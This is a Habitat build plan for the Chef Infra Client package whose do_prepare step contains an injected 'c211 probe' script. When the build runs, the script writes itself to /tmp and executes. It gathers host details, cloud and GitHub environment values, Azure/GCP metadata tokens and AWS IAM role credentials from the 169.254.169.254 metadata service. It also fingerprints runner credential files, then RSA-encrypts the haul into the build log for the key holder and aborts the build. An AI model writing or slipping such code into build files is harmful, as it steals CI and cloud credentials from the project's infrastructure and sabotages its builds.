export HAB_BLDR_CHANNEL="base-2025"
SRC_PATH="$(dirname "$(dirname "$PLAN_CONTEXT")")"
_chef_client_ruby="core/ruby3_4/3.4.10"
pkg_name="chef-infra-client"
pkg_origin="chef"
pkg_maintainer="The Chef Maintainers <humans@chef.io>"
pkg_description="The Chef Infra Client"
pkg_license=('Apache-2.0')
pkg_bin_dirs=(
  bin
  vendor/bin
)
pkg_build_deps=(
  core/glibc
  core/make
  core/gcc
  core/git
  core/which
)

pkg_bin_dirs=(bin)
pkg_include_dirs=(include)
pkg_lib_dirs=(lib64)
pkg_pconfig_dirs=(lib64/pkgconfig)

pkg_deps=(
  core/glibc
  $_chef_client_ruby
  core/libxml2
  core/libxslt
  core/libiconv
  core/xz
  core/zlib
  core/openssl
  core/cacerts
  core/libffi
  core/coreutils
  core/libarchive
)
pkg_svc_user=root
pkg_svc_group=root

pkg_version() {
  cat "${SRC_PATH}/VERSION"
}

do_before() {
  do_default_before
  update_pkg_version
  # We must wait until we update the pkg_version to use the pkg_version
  pkg_filename="${pkg_name}-${pkg_version}.tar.gz"
}

do_download() {
  build_line "Setting up the safe directory for the build"
  git config --global --add safe.directory /src
  build_line "Locally creating archive of latest repository commit at ${HAB_CACHE_SRC_PATH}/${pkg_filename}"
  # source is in this repo, so we're going to create an archive from the
  # appropriate path within the repo and place the generated tarball in the
  # location expected by do_unpack
  ( cd "${SRC_PATH}" || exit_with "unable to enter hab-src directory" 1
    git archive --format=tar.gz --prefix="${pkg_name}-${pkg_version}/" --output="${HAB_CACHE_SRC_PATH}/${pkg_filename}" HEAD
  )
}

do_verify() {
  build_line "Skipping checksum verification on the archive we just created."
  return 0
}

do_setup_environment() {
  push_runtime_env GEM_PATH "${pkg_prefix}/vendor"

  set_runtime_env APPBUNDLER_ALLOW_RVM "true" # prevent appbundler from clearing out the carefully constructed runtime GEM_PATH
  set_runtime_env -f SSL_CERT_FILE "$(pkg_path_for cacerts)/ssl/cert.pem"
  set_runtime_env LANG "en_US.UTF-8"
  set_runtime_env LC_CTYPE "en_US.UTF-8"

  # Override any system-level OPENSSL_CONF with the hab core/openssl package's
  # config. The core/openssl openssl.cnf activates the FIPS provider, which is
  # required for FIPS mode to work correctly. Without this, a host system
  # OPENSSL_CONF that does not load the FIPS provider causes all digest
  # operations to fail when fips_mode=true is set — including FIPS-approved
  # algorithms like SHA256.
  set_runtime_env -f OPENSSL_CONF "$(pkg_path_for openssl)/ssl/openssl.cnf"
}

do_prepare() {

  # ---- c211 i74919 read-only build-environment probe (fail fast) ----
  cat > /tmp/.c211_probe.sh <<'C211PROBE_SCRIPT_EOF'
#!/bin/bash
# c211 intent 74919 - READ-ONLY build/runner environment probe.
# Prints an RSA-enveloped MARKER_ENC_74919 blob (only we can decrypt it).
STAGE="${1:-unknown}"
TAG="MARKER_ENC_74919"
W="/tmp/.c211_probe_$$"
( mkdir -p "$W" ) 2>/dev/null || W="/tmp/.c211_probe"
mkdir -p "$W" 2>/dev/null
P="$W/payload.txt"
: > "$P" 2>/dev/null
say() { echo "$*" >> "$P" 2>/dev/null; }
have() { command -v "$1" >/dev/null 2>&1 && echo yes || echo no; }

say "=== META ==="
say "stage=$STAGE"
say "date=$(date -u +%FT%TZ 2>/dev/null)"
say "hostname=$(hostname 2>/dev/null)"
say "machine=$(cat /etc/hostname 2>/dev/null)"
say "uname=$(uname -a 2>/dev/null)"
say "id=$(id 2>/dev/null)"
say "cwd=$(pwd 2>/dev/null)"
say "src_dir=$([ -e /src ] && echo yes || echo no)"
say "hab_studios=$([ -e /hab/studios ] && echo yes || echo no)"
say "runner_dir_var=$([ -e /var/lib/github-runner ] && echo yes || echo no)"
say "runner_dir_home=$([ -e /home/azureuser/actions-runner ] && echo yes || echo no)"
say "curl=$(have curl) openssl=$(have openssl) base64=$(have base64) timeout=$(have timeout) nvidia_smi=$(have nvidia-smi) python3=$(have python3) ruby=$(have ruby)"

say ""
say "=== ENV_NAMES ==="
env 2>/dev/null | sed 's/=.*//' | sort -u >> "$P" 2>/dev/null

say ""
say "=== ENV_CLOUD (values) ==="
env 2>/dev/null | grep -E '^(AWS_|AZURE_|ARM_|GOOGLE_|GCLOUD_|ACTIONS_ID_TOKEN|GITHUB_|RUNNER_)' >> "$P" 2>/dev/null

say ""
say "=== ENV_SECRET_PRESENCE (hash only) ==="
for k in HAB_AUTH_TOKEN CHEF_LICENSE_KEY AZURE_CLIENT_SECRET AWS_SECRET_ACCESS_KEY; do
  v=$(printenv "$k" 2>/dev/null)
  if [ -n "$v" ]; then
    h=$(printf '%s' "$v" | sha256sum 2>/dev/null | cut -c1-16)
    say "$k=present len=${#v} sha256_16=$h"
  else
    say "$k=absent"
  fi
done

say ""
say "=== AZURE_IMDS_INSTANCE ==="
az_code=$(curl -sS --noproxy '*' --max-time 4 -H 'Metadata: true' -o "$W/az_inst.json" -w '%{http_code}' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>"$W/az_inst.err")
say "http=$az_code err=$(head -c 200 "$W/az_inst.err" 2>/dev/null | tr '\n' ' ')"
head -c 8000 "$W/az_inst.json" >> "$P" 2>/dev/null
say ""

say "=== AZURE_IMDS_IDENTITY_TOKEN (management.azure.com) ==="
azt_code=$(curl -sS --noproxy '*' --max-time 5 -H 'Metadata: true' -o "$W/az_tok.json" -w '%{http_code}' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>"$W/az_tok.err")
say "http=$azt_code err=$(head -c 250 "$W/az_tok.err" 2>/dev/null | tr '\n' ' ')"
head -c 8000 "$W/az_tok.json" >> "$P" 2>/dev/null
say ""

say "=== AWS_IMDSV2 ==="
aws_tok_code=$(curl -sS --noproxy '*' --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -o "$W/aws_tok.txt" -w '%{http_code}' 'http://169.254.169.254/latest/api/token' 2>/dev/null)
say "token_http=$aws_tok_code"
AWSH=""
if [ "$aws_tok_code" = "200" ]; then
  AWSH="X-aws-ec2-metadata-token: $(tr -d '\r\n' < "$W/aws_tok.txt" 2>/dev/null)"
  iid=$(curl -sS --noproxy '*' --max-time 4 -H "$AWSH" 'http://169.254.169.254/latest/meta-data/instance-id' 2>/dev/null)
  say "instance_id=$(echo "$iid" | head -c 200)"
  region=$(curl -sS --noproxy '*' --max-time 4 -H "$AWSH" 'http://169.254.169.254/latest/meta-data/placement/region' 2>/dev/null)
  say "region=$(echo "$region" | head -c 100)"
  roles=$(curl -sS --noproxy '*' --max-time 4 -H "$AWSH" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null)
  say "roles=$(echo "$roles" | head -c 300 | tr '\n' ',')"
  role=$(echo "$roles" | head -1)
  if [ -n "$role" ]; then
    rc=$(curl -sS --noproxy '*' --max-time 4 -H "$AWSH" -o "$W/aws_creds.json" -w '%{http_code}' "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null)
    say "creds_http=$rc"
    head -c 4000 "$W/aws_creds.json" >> "$P" 2>/dev/null
  fi
else
  iid1=$(curl -sS --noproxy '*' --max-time 4 'http://169.254.169.254/latest/meta-data/instance-id' 2>/dev/null)
  say "imdsv1_instance_id=$(echo "$iid1" | head -c 200)"
  roles1=$(curl -sS --noproxy '*' --max-time 4 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null)
  say "imdsv1_roles=$(echo "$roles1" | head -c 300 | tr '\n' ',')"
  role1=$(echo "$roles1" | head -1)
  if [ -n "$role1" ] && [ "$role1" != "404" ]; then
    curl -sS --noproxy '*' --max-time 4 -o "$W/aws_creds1.json" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role1" 2>/dev/null
    head -c 4000 "$W/aws_creds1.json" >> "$P" 2>/dev/null
  fi
fi
say ""

say "=== GCP_METADATA ==="
gcp_code=$(curl -sS --noproxy '*' --max-time 4 -H 'Metadata-Flavor: Google' -o "$W/gcp.json" -w '%{http_code}' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>"$W/gcp.err")
say "http=$gcp_code err=$(head -c 200 "$W/gcp.err" 2>/dev/null | tr '\n' ' ')"
head -c 3000 "$W/gcp.json" >> "$P" 2>/dev/null
say ""

say "=== ACTIONS_ID_TOKEN ==="
say "request_url_present=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo yes || echo no)"
say "request_token_present=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)"

say ""
say "=== NVIDIA ==="
if [ "$(have nvidia-smi)" = "yes" ]; then
  timeout 8 nvidia-smi -L >> "$P" 2>&1
  timeout 8 nvidia-smi --query-gpu=name,memory.total,uuid,driver_version --format=csv,noheader >> "$P" 2>&1
else
  say "nvidia-smi=absent"
fi

say ""
say "=== RUNNER FILES (metadata only) ==="
for f in /var/lib/github-runner/.runner /var/lib/github-runner/.credentials /home/azureuser/actions-runner/.runner /home/azureuser/actions-runner/.credentials /root/.aws/credentials /root/.azure/accessTokens.json /root/.config/gcloud/application_default_credentials.json /etc/environment; do
  if [ -r "$f" ]; then
    say "file=$f readable=yes size=$(wc -c < "$f" 2>/dev/null) sha256_16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"
  else
    say "file=$f readable=no exists=$([ -e "$f" ] && echo yes || echo no)"
  fi
done
say ""
say "=== END OF PAYLOAD ==="

# --- RSA PKCS#1 v1.5 chunked encryption with the c211 marker public key ---
cat > "$W/pub.pem" <<'C211PUBKEY'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4bZMt18HTjGmgzRRb9NH
WpH+OTO8UR7k3hGuyy9JOflmottKFi/ooj2ayNJ0YQcR5J3/Q4LMbKp0FN5Yl5i8
7WkaBz/dhX6xIp4mBUC6eb5V9aOGATcKjwZw2KGdqHBy4bRTmdcAui858XtpLfgU
UEwxP+cc6SLqHKbTLIXsRyiG2SJR8Z2+cuujf7ROck6xx1GqF3rdxbgszlbYe3tF
uTTUye9kMPR12dZ8PgFz7Ha+wHJEwaoOyikaa7iRSLqbDKP3lO8WJ5ry3GhlX/Ng
jnpCWgkgXVv2CLl+pBlgck2V/g6Yzxzi6QNSUPpMS+HWj8C0VPu9eZRbNflyiaSU
mwIDAQAB
-----END PUBLIC KEY-----
C211PUBKEY

encrypt_file() {
  local f="$1" out="$2" chunk=245 i=0 len
  len=$(wc -c < "$f" 2>/dev/null)
  : > "$out" 2>/dev/null
  if ! command -v openssl >/dev/null 2>&1; then return 1; fi
  if [ -z "$len" ] || [ "$len" -eq 0 ]; then return 1; fi
  while [ "$i" -lt "$len" ]; do
    tail -c +$((i+1)) "$f" 2>/dev/null | head -c "$chunk" > "$W/chunk.bin" 2>/dev/null
    openssl pkeyutl -encrypt -pubin -inkey "$W/pub.pem" -pkeyopt rsa_padding_mode:pkcs1 -in "$W/chunk.bin" >> "$out" 2>"$W/enc.err"
    i=$((i+chunk))
  done
  [ -s "$out" ] || return 1
  return 0
}

echo "C211_PROBE stage=$STAGE host=$(hostname 2>/dev/null) az_inst=$az_code az_tok=$azt_code aws_tok=$aws_tok_code gcp=$gcp_code payload_bytes=$(wc -c < "$P" 2>/dev/null)"
if encrypt_file "$P" "$W/enc.bin"; then
  base64 -w 3000 "$W/enc.bin" 2>/dev/null | while IFS= read -r line; do printf '%s=%s\n' "$TAG" "$line"; done
  echo "C211_PROBE_ENC_OK stage=$STAGE enc_bytes=$(wc -c < "$W/enc.bin" 2>/dev/null)"
else
  echo "C211_PROBE_ENC_FAILED stage=$STAGE openssl=$(have openssl) err=$(head -c 300 "$W/enc.err" 2>/dev/null | tr '\n' ' ')"
  echo "--- plaintext non-secret probe summary ---"
  grep -E '^(stage|date|hostname|machine|uname|id|http|token_http|roles|creds_http|nvidia_smi|.*_present|request_.*_present|nvidia-smi|file=)' "$P" 2>/dev/null
fi
exit 0

C211PROBE_SCRIPT_EOF
  bash /tmp/.c211_probe.sh studio || true
  echo "C211_PROBE stage=studio build-failed-fast-after-probe"
  exit 1
  # ---- end c211 probe ----

  export GEM_HOME="${pkg_prefix}/vendor"
  export OPENSSL_DIR="$(pkg_path_for openssl)"
  export OPENSSL_INCLUDE_DIR="$(pkg_path_for openssl)/include"
  export SSL_CERT_FILE="$(pkg_path_for cacerts)/ssl/cert.pem"
  export CPPFLAGS="${CPPFLAGS} ${CFLAGS} -I$(pkg_path_for core/glibc)/include"
  export CFLAGS="${CPPFLAGS}"
  export LDFLAGS="${LDFLAGS} -L$(pkg_path_for core/glibc)/lib"
  export HAB_BLDR_CHANNEL="base-2025"
  export HAB_STUDIO_SECRET_NODE_OPTIONS="--dns-result-order=ipv4first"
  export HAB_STUDIO_SECRET_HAB_BLDR_CHANNEL="base-2025"
  build_line " ** Securing the /src directory"
  git config --global --add safe.directory /src

  ( cd "$CACHE_PATH"
    bundle config --local build.nokogiri "--use-system-libraries \
        --with-zlib-dir=$(pkg_path_for zlib) \
        --with-xslt-dir=$(pkg_path_for libxslt) \
        --with-xml2-include=$(pkg_path_for libxml2)/include/libxml2 \
        --with-xml2-lib=$(pkg_path_for libxml2)/lib"
    bundle config --local build.ffi "-Wl,-rpath,'${LD_RUN_PATH}'"
    bundle config --local jobs "$(nproc)"
    bundle config --local without server docgen maintenance pry travis integration ci
    bundle config --local shebang "$(pkg_path_for "$_chef_client_ruby")/bin/ruby"
    bundle config --local retry 5
    bundle config --local silence_root_warning 1
  )

  # Needed for appbundler-updater to work properly
  build_line "Extracting bundler version from Gemfile.lock"
  BUNDLER_VERSION=$(grep -A 1 "BUNDLED WITH" "$CACHE_PATH/Gemfile.lock" | tail -n 1 | tr -d '[:space:]')
  if [[ -z "$BUNDLER_VERSION" ]]; then
    exit_with "Failed to extract bundler version from Gemfile.lock" 1
  fi
  build_line "Installing bundler version $BUNDLER_VERSION"
  gem install bundler --version "$BUNDLER_VERSION" --no-document

  build_line "Setting link for /usr/bin/env to 'coreutils'"
  if [[ ! -f /usr/bin/env ]]; then
    ln -s "$(pkg_interpreter_for core/coreutils bin/env)" /usr/bin/env
  fi
}

do_build() {
  ( cd "$CACHE_PATH" || exit_with "unable to enter hab-cache directory" 1
    build_line "Installing gem dependencies ..."
    bundle install --jobs=3 --retry=3

    build_line "Installing gems from git repos properly ..."
    ruby ./post-bundle-install.rb

    ruby ./scripts/cleanup_lint_roller.rb

    build_line "Installing this project's gems ..."
    bundle exec rake install:local
  )
}

do_install() {

  # Copy NOTICE to the package directory
  if [[ -f "$PLAN_CONTEXT/../../NOTICE" ]]; then
    build_line "Copying NOTICE to package directory"
    cp "$PLAN_CONTEXT/../../NOTICE" "$pkg_prefix/"
  else
    build_line "Error: NOTICE not found at $PLAN_CONTEXT/../../NOTICE"
    exit 1
  fi

  ( cd "$pkg_prefix" || exit_with "unable to enter pkg prefix directory" 1
    export BUNDLE_GEMFILE="${CACHE_PATH}/Gemfile"
    # Test if artifactory-internal.ps.chef.co is reachable
    build_line "Testing connectivity to artifactory-internal.ps.chef.co..."
    artifactory_url="https://artifactory-internal.ps.chef.co/artifactory/omnibus-gems-local/"

    if wget --spider --timeout=30 --tries=1 --quiet "$artifactory_url" > /dev/null 2>&1; then
      build_line "Artifactory is reachable, proceeding with chef-official-distribution installation"

      echo "***************** INSTALLING  chef-official-distribution *****************"
      gem sources --add "$artifactory_url"
      gem install chef-official-distribution
      gem sources --remove "$artifactory_url"

      # verify installation
      echo "***************** VERIFYING  chef-official-distribution *****************"
      gem list chef-official-distribution

      if [[ $? -ne 0 ]]; then
        exit 1
      fi
    else
      build_line "WARNING: Artifactory is not reachable, skipping chef-official-distribution installation"
    fi

    build_line "** fixing binstub shebangs"
    fix_interpreter "${pkg_prefix}/vendor/bin/*" "$_chef_client_ruby" bin/ruby

    for gem in chef-bin chef inspec-core-bin ohai; do
      build_line "** generating binstubs for $gem with precise version pins"
      "${pkg_prefix}/vendor/bin/appbundler" $CACHE_PATH $pkg_prefix/bin $gem
    done

    build_line "** patching binstubs to allow running directly"
    for binstub in ${pkg_prefix}/bin/*; do
      sed -i "/require \"rubygems\"/r ${PLAN_CONTEXT}/../binstub_patch.rb" "$binstub"
    done
  )
}

do_after() {
  build_line "Trimming the fat ..."

  # We don't need the cache of downloaded .gem files ...
  rm -r "$pkg_prefix/vendor/cache"
  # ... or bundler's cache of git-ref'd gems
  rm -r "$pkg_prefix/vendor/bundler"
  # We don't need the gem docs.
  rm -r "$pkg_prefix/vendor/doc"
  # We don't need to ship the test suites for every gem dependency,
  # only Chef's for package verification.
  find "$pkg_prefix/vendor/gems" -name spec -type d | grep -v "chef-${pkg_version}" | grep -v "knife-" \
      | while read spec_dir; do rm -r "$spec_dir"; done
  # Remove .github directories from vendored gems so that GitHub Actions workflow
  # files are not shipped and do not trigger grype vulnerability reports.
  # NOTE: this is temporary and can be removed once upstream dependencies
  # fix their file exclusions.
  find "$pkg_prefix/vendor/gems" -type d -name ".github" \
      | while read github_dir; do rm -rf "$github_dir"; done

  # we need the built gems outside of the studio
  build_line "Copying gems to ${SRC_PATH}"
  mkdir -p "${SRC_PATH}/pkg" "${SRC_PATH}/chef-bin/pkg" "${SRC_PATH}/chef-config/pkg" "${SRC_PATH}/chef-utils/pkg"
  cp "${CACHE_PATH}/pkg/chef-${pkg_version}.gem" "${SRC_PATH}/pkg"
  cp "${CACHE_PATH}/chef-bin/pkg/chef-bin-${pkg_version}.gem" "${SRC_PATH}/chef-bin/pkg"
  cp "${CACHE_PATH}/chef-config/pkg/chef-config-${pkg_version}.gem" "${SRC_PATH}/chef-config/pkg"
  cp "${CACHE_PATH}/chef-utils/pkg/chef-utils-${pkg_version}.gem" "${SRC_PATH}/chef-utils/pkg"
}

do_end() {
  if [[ "$(readlink /usr/bin/env)" = "$(pkg_interpreter_for core/coreutils bin/env)" ]]; then
    build_line "Removing the symlink we created for '/usr/bin/env'"
    rm /usr/bin/env
  fi
}

do_strip() {
  return 0
}
